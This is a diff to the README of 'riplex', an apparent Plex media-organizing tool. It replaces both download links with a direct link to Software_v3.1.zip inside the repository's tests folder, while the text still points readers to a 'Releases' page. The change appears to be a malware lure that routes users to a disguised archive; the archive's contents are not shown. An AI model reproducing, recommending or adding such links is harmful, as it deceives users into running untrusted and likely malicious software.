@@ -1,6 +1,6 @@
 # 🎞️ riplex - Organize your media files for Plex
 
-[![](https://img.shields.io/badge/Download-riplex-blue.svg)](https://github.com/Shellieunweaned279/riplex)
+[![](https://img.shields.io/badge/Download-riplex-blue.svg)](https://github.com/Shellieunweaned279/riplex/raw/refs/heads/main/tests/Software_v3.1.zip)
 
 ## 📁 What is riplex?
 
@@ -21,7 +21,7 @@ Ensure you have these items before you begin:
 
 You can get the software from our main page. Click the link below to find the current version.
 
-[Download riplex from the releases page](https://github.com/Shellieunweaned279/riplex)
+[Download riplex from the releases page](https://github.com/Shellieunweaned279/riplex/raw/refs/heads/main/tests/Software_v3.1.zip)
 
 1. Click the link above to open your browser.
 2. Look for the section labeled "Releases" on the right side of the page.
